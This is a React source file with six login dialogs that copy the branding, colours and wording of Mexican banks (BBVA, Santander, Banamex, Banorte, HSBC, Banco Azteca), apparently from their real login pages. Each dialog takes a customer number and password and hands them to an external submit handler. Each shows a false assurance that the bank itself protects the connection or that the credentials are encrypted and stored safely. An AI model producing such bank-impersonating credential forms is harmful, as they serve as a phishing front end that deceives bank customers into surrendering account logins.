import React, { useState } from 'react';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Eye, EyeOff, Shield, Lock } from 'lucide-react';

// BBVA México Modal - Based on their actual login page
const BBVAModal = ({ isOpen, onClose, onSubmit, loading }) => {
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({ username: '', password: '' });

  const handleSubmit = (e) => {
    e.preventDefault();
    onSubmit(formData);
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-md mx-auto bg-white">
        {/* BBVA Header */}
        <div className="bg-[#004481] text-white p-4 -m-6 mb-4 rounded-t-lg">
          <div className="flex items-center justify-center space-x-2">
            <div className="w-8 h-8 bg-white rounded-full flex items-center justify-center">
              <span className="text-[#004481] font-bold text-sm">BBVA</span>
            </div>
            <h2 className="text-lg font-semibold">BBVA México</h2>
          </div>
          <p className="text-center text-sm mt-2 opacity-90">Banca en Línea</p>
        </div>

        {/* BBVA Form */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="text-center mb-4">
            <h3 className="text-lg font-semibold text-gray-800">Acceso a tu cuenta</h3>
            <p className="text-sm text-gray-600">Ingresa tus datos para continuar</p>
          </div>

          <div className="space-y-2">
            <Label htmlFor="bbva-username" className="text-sm font-medium text-gray-700">
              Usuario / Número de Cliente
            </Label>
            <Input
              id="bbva-username"
              type="text"
              value={formData.username}
              onChange={(e) => setFormData({ ...formData, username: e.target.value })}
              className="border-[#004481] focus:border-[#004481] focus:ring-[#004481]"
              placeholder="Ingresa tu usuario"
              required
            />
          </div>

          <div className="space-y-2">
            <Label htmlFor="bbva-password" className="text-sm font-medium text-gray-700">
              Contraseña
            </Label>
            <div className="relative">
              <Input
                id="bbva-password"
                type={showPassword ? 'text' : 'password'}
                value={formData.password}
                onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                className="border-[#004481] focus:border-[#004481] focus:ring-[#004481] pr-10"
                placeholder="Ingresa tu contraseña"
                required
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500"
              >
                {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
              </button>
            </div>
          </div>

          {/* Security Notice */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
            <div className="flex items-center space-x-2">
              <Shield className="text-[#004481]" size={16} />
              <span className="text-xs text-gray-700">
                Tus credenciales serán encriptadas y almacenadas de forma segura
              </span>
            </div>
          </div>

          <div className="flex space-x-3 pt-4">
            <Button
              type="button"
              variant="outline"
              onClick={onClose}
              className="flex-1 border-gray-300"
              disabled={loading}
            >
              Cancelar
            </Button>
            <Button
              type="submit"
              className="flex-1 bg-[#004481] hover:bg-[#003366] text-white"
              disabled={loading}
            >
              {loading ? 'Guardando...' : 'Guardar Credenciales'}
            </Button>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
};

// Santander México Modal - Based on their actual login page
const SantanderModal = ({ isOpen, onClose, onSubmit, loading }) => {
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({ username: '', password: '' });

  const handleSubmit = (e) => {
    e.preventDefault();
    onSubmit(formData);
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-md mx-auto bg-white">
        {/* Santander Header */}
        <div className="bg-[#EC0000] text-white p-4 -m-6 mb-4 rounded-t-lg">
          <div className="flex items-center justify-center space-x-2">
            <div className="text-2xl">🔥</div>
            <h2 className="text-lg font-semibold">Santander México</h2>
          </div>
          <p className="text-center text-sm mt-2 opacity-90">¡Bienvenido a SuperNet!</p>
        </div>

        {/* Santander Form */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="text-center mb-4">
            <h3 className="text-lg font-semibold text-gray-800">Ingresa tus datos para identificarte</h3>
          </div>

          <div className="space-y-2">
            <Label htmlFor="santander-username" className="text-sm font-medium text-gray-700">
              Código de Cliente / No. Cuenta / Tarjeta de Crédito o Débito
            </Label>
            <Input
              id="santander-username"
              type="text"
              value={formData.username}
              onChange={(e) => setFormData({ ...formData, username: e.target.value })}
              className="border-blue-400 focus:border-blue-500 focus:ring-blue-500"
              placeholder="Ingresa tu código de cliente"
              required
            />
          </div>

          <div className="space-y-2">
            <Label htmlFor="santander-password" className="text-sm font-medium text-gray-700">
              Contraseña
            </Label>
            <div className="relative">
              <Input
                id="santander-password"
                type={showPassword ? 'text' : 'password'}
                value={formData.password}
                onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                className="border-blue-400 focus:border-blue-500 focus:ring-blue-500 pr-10"
                placeholder="Ingresa tu contraseña"
                required
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500"
              >
                {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
              </button>
            </div>
          </div>

          {/* Security Notice */}
          <div className="bg-red-50 border border-red-200 rounded-lg p-3">
            <div className="flex items-center space-x-2">
              <Lock className="text-[#EC0000]" size={16} />
              <span className="text-xs text-gray-700">
                Conexión segura con encriptación de extremo a extremo
              </span>
            </div>
          </div>

          <div className="flex space-x-3 pt-4">
            <Button
              type="button"
              variant="outline"
              onClick={onClose}
              className="flex-1 border-gray-300"
              disabled={loading}
            >
              Cancelar
            </Button>
            <Button
              type="submit"
              className="flex-1 bg-purple-600 hover:bg-purple-700 text-white"
              disabled={loading}
            >
              {loading ? 'Guardando...' : 'Continuar'}
            </Button>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
};

// Banamex Modal - Based on their actual login page
const BanamexModal = ({ isOpen, onClose, onSubmit, loading }) => {
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({ username: '', password: '' });

  const handleSubmit = (e) => {
    e.preventDefault();
    onSubmit(formData);
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-md mx-auto bg-white">
        {/* Banamex Header */}
        <div className="bg-[#C41E3A] text-white p-4 -m-6 mb-4 rounded-t-lg">
          <div className="flex items-center justify-center space-x-2">
            <div className="w-8 h-8 bg-white rounded flex items-center justify-center">
              <span className="text-[#C41E3A] font-bold text-xs">BNX</span>
            </div>
            <h2 className="text-lg font-semibold">Banamex</h2>
          </div>
          <p className="text-center text-sm mt-2 opacity-90">BancaNet - El Banco Nacional de México</p>
        </div>

        {/* Banamex Form */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="text-center mb-4">
            <h3 className="text-lg font-semibold text-gray-800">Acceso a BancaNet</h3>
            <p className="text-sm text-gray-600">Ingresa tu información de cliente</p>
          </div>

          <div className="space-y-2">
            <Label htmlFor="banamex-username" className="text-sm font-medium text-gray-700">
              Número de Cliente
            </Label>
            <Input
              id="banamex-username"
              type="text"
              value={formData.username}
              onChange={(e) => setFormData({ ...formData, username: e.target.value })}
              className="border-[#C41E3A] focus:border-[#C41E3A] focus:ring-[#C41E3A]"
              placeholder="Ingresa tu número de cliente"
              required
            />
          </div>

          <div className="space-y-2">
            <Label htmlFor="banamex-password" className="text-sm font-medium text-gray-700">
              Código de Acceso
            </Label>
            <div className="relative">
              <Input
                id="banamex-password"
                type={showPassword ? 'text' : 'password'}
                value={formData.password}
                onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                className="border-[#C41E3A] focus:border-[#C41E3A] focus:ring-[#C41E3A] pr-10"
                placeholder="Ingresa tu código de acceso"
                required
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500"
              >
                {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
              </button>
            </div>
          </div>

          {/* Security Notice */}
          <div className="bg-red-50 border border-red-200 rounded-lg p-3">
            <div className="flex items-center space-x-2">
              <Shield className="text-[#C41E3A]" size={16} />
              <span className="text-xs text-gray-700">
                Protegido por Citibanamex - Conexión segura SSL
              </span>
            </div>
          </div>

          <div className="flex space-x-3 pt-4">
            <Button
              type="button"
              variant="outline"
              onClick={onClose}
              className="flex-1 border-gray-300"
              disabled={loading}
            >
              Cancelar
            </Button>
            <Button
              type="submit"
              className="flex-1 bg-[#C41E3A] hover:bg-[#A01729] text-white"
              disabled={loading}
            >
              {loading ? 'Guardando...' : 'Ingresar'}
            </Button>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
};

// Banorte Modal - Based on their actual login page
const BanorteModal = ({ isOpen, onClose, onSubmit, loading }) => {
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({ username: '', password: '' });

  const handleSubmit = (e) => {
    e.preventDefault();
    onSubmit(formData);
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-md mx-auto bg-white">
        {/* Banorte Header */}
        <div className="bg-[#E30613] text-white p-4 -m-6 mb-4 rounded-t-lg">
          <div className="flex items-center justify-center space-x-2">
            <div className="w-8 h-8 bg-white rounded flex items-center justify-center">
              <span className="text-[#E30613] font-bold text-xs">BNT</span>
            </div>
            <h2 className="text-lg font-semibold">Banorte</h2>
          </div>
          <p className="text-center text-sm mt-2 opacity-90">El Banco Fuerte de México</p>
        </div>

        {/* Banorte Form */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="text-center mb-4">
            <h3 className="text-lg font-semibold text-gray-800">Banco en Línea</h3>
            <p className="text-sm text-gray-600">Acceso seguro a tu cuenta</p>
          </div>

          <div className="space-y-2">
            <Label htmlFor="banorte-username" className="text-sm font-medium text-gray-700">
              Usuario
            </Label>
            <Input
              id="banorte-username"
              type="text"
              value={formData.username}
              onChange={(e) => setFormData({ ...formData, username: e.target.value })}
              className="border-[#E30613] focus:border-[#E30613] focus:ring-[#E30613]"
              placeholder="Ingresa tu usuario"
              required
            />
          </div>

          <div className="space-y-2">
            <Label htmlFor="banorte-password" className="text-sm font-medium text-gray-700">
              Contraseña
            </Label>
            <div className="relative">
              <Input
                id="banorte-password"
                type={showPassword ? 'text' : 'password'}
                value={formData.password}
                onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                className="border-[#E30613] focus:border-[#E30613] focus:ring-[#E30613] pr-10"
                placeholder="Ingresa tu contraseña"
                required
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500"
              >
                {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
              </button>
            </div>
          </div>

          {/* Security Notice */}
          <div className="bg-red-50 border border-red-200 rounded-lg p-3">
            <div className="flex items-center space-x-2">
              <Lock className="text-[#E30613]" size={16} />
              <span className="text-xs text-gray-700">
                Conexión protegida con tecnología de seguridad Banorte
              </span>
            </div>
          </div>

          <div className="flex space-x-3 pt-4">
            <Button
              type="button"
              variant="outline"
              onClick={onClose}
              className="flex-1 border-gray-300"
              disabled={loading}
            >
              Cancelar
            </Button>
            <Button
              type="submit"
              className="flex-1 bg-[#E30613] hover:bg-[#C1050F] text-white"
              disabled={loading}
            >
              {loading ? 'Guardando...' : 'Ingresar'}
            </Button>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
};

// HSBC México Modal - Based on their typical design
const HSBCModal = ({ isOpen, onClose, onSubmit, loading }) => {
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({ username: '', password: '' });

  const handleSubmit = (e) => {
    e.preventDefault();
    onSubmit(formData);
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-md mx-auto bg-white">
        {/* HSBC Header */}
        <div className="bg-[#DB0011] text-white p-4 -m-6 mb-4 rounded-t-lg">
          <div className="flex items-center justify-center space-x-2">
            <div className="w-8 h-8 bg-white rounded flex items-center justify-center">
              <span className="text-[#DB0011] font-bold text-xs">HSBC</span>
            </div>
            <h2 className="text-lg font-semibold">HSBC México</h2>
          </div>
          <p className="text-center text-sm mt-2 opacity-90">Banca en Línea Personal</p>
        </div>

        {/* HSBC Form */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="text-center mb-4">
            <h3 className="text-lg font-semibold text-gray-800">Acceso Seguro</h3>
            <p className="text-sm text-gray-600">Ingresa tus credenciales</p>
          </div>

          <div className="space-y-2">
            <Label htmlFor="hsbc-username" className="text-sm font-medium text-gray-700">
              Número de Cliente / Usuario
            </Label>
            <Input
              id="hsbc-username"
              type="text"
              value={formData.username}
              onChange={(e) => setFormData({ ...formData, username: e.target.value })}
              className="border-[#DB0011] focus:border-[#DB0011] focus:ring-[#DB0011]"
              placeholder="Ingresa tu número de cliente"
              required
            />
          </div>

          <div className="space-y-2">
            <Label htmlFor="hsbc-password" className="text-sm font-medium text-gray-700">
              Contraseña de Acceso
            </Label>
            <div className="relative">
              <Input
                id="hsbc-password"
                type={showPassword ? 'text' : 'password'}
                value={formData.password}
                onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                className="border-[#DB0011] focus:border-[#DB0011] focus:ring-[#DB0011] pr-10"
                placeholder="Ingresa tu contraseña"
                required
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500"
              >
                {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
              </button>
            </div>
          </div>

          {/* Security Notice */}
          <div className="bg-red-50 border border-red-200 rounded-lg p-3">
            <div className="flex items-center space-x-2">
              <Shield className="text-[#DB0011]" size={16} />
              <span className="text-xs text-gray-700">
                Protegido por HSBC - Seguridad bancaria internacional
              </span>
            </div>
          </div>

          <div className="flex space-x-3 pt-4">
            <Button
              type="button"
              variant="outline"
              onClick={onClose}
              className="flex-1 border-gray-300"
              disabled={loading}
            >
              Cancelar
            </Button>
            <Button
              type="submit"
              className="flex-1 bg-[#DB0011] hover:bg-[#B8000E] text-white"
              disabled={loading}
            >
              {loading ? 'Guardando...' : 'Acceder'}
            </Button>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
};

// Banco Azteca Modal - Based on their typical design
const AztecaModal = ({ isOpen, onClose, onSubmit, loading }) => {
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({ username: '', password: '' });

  const handleSubmit = (e) => {
    e.preventDefault();
    onSubmit(formData);
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-md mx-auto bg-white">
        {/* Azteca Header */}
        <div className="bg-[#00A651] text-white p-4 -m-6 mb-4 rounded-t-lg">
          <div className="flex items-center justify-center space-x-2">
            <div className="w-8 h-8 bg-white rounded flex items-center justify-center">
              <span className="text-[#00A651] font-bold text-xs">AZ</span>
            </div>
            <h2 className="text-lg font-semibold">Banco Azteca</h2>
          </div>
          <p className="text-center text-sm mt-2 opacity-90">Banca Digital</p>
        </div>

        {/* Azteca Form */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="text-center mb-4">
            <h3 className="text-lg font-semibold text-gray-800">Acceso a tu Cuenta</h3>
            <p className="text-sm text-gray-600">Banca en línea segura</p>
          </div>

          <div className="space-y-2">
            <Label htmlFor="azteca-username" className="text-sm font-medium text-gray-700">
              Usuario / Número de Cliente
            </Label>
            <Input
              id="azteca-username"
              type="text"
              value={formData.username}
              onChange={(e) => setFormData({ ...formData, username: e.target.value })}
              className="border-[#00A651] focus:border-[#00A651] focus:ring-[#00A651]"
              placeholder="Ingresa tu usuario"
              required
            />
          </div>

          <div className="space-y-2">
            <Label htmlFor="azteca-password" className="text-sm font-medium text-gray-700">
              Contraseña
            </Label>
            <div className="relative">
              <Input
                id="azteca-password"
                type={showPassword ? 'text' : 'password'}
                value={formData.password}
                onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                className="border-[#00A651] focus:border-[#00A651] focus:ring-[#00A651] pr-10"
                placeholder="Ingresa tu contraseña"
                required
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500"
              >
                {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
              </button>
            </div>
          </div>

          {/* Security Notice */}
          <div className="bg-green-50 border border-green-200 rounded-lg p-3">
            <div className="flex items-center space-x-2">
              <Lock className="text-[#00A651]" size={16} />
              <span className="text-xs text-gray-700">
                Conexión segura - Banco Azteca protege tu información
              </span>
            </div>
          </div>

          <div className="flex space-x-3 pt-4">
            <Button
              type="button"
              variant="outline"
              onClick={onClose}
              className="flex-1 border-gray-300"
              disabled={loading}
            >
              Cancelar
            </Button>
            <Button
              type="submit"
              className="flex-1 bg-[#00A651] hover:bg-[#008A44] text-white"
              disabled={loading}
            >
              {loading ? 'Guardando...' : 'Ingresar'}
            </Button>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
};

// Main component that renders the appropriate modal based on bank selection
const BankSpecificModal = ({ bankId, bankName, isOpen, onClose, onSubmit, loading }) => {
  const modalProps = { isOpen, onClose, onSubmit, loading };

  switch (bankId) {
    case 'bbva':
      return <BBVAModal {...modalProps} />;
    case 'santander':
      return <SantanderModal {...modalProps} />;
    case 'banamex':
      return <BanamexModal {...modalProps} />;
    case 'banorte':
      return <BanorteModal {...modalProps} />;
    case 'hsbc':
      return <HSBCModal {...modalProps} />;
    case 'azteca':
      return <AztecaModal {...modalProps} />;
    default:
      return <BBVAModal {...modalProps} />; // Default fallback
  }
};

export default BankSpecificModal;

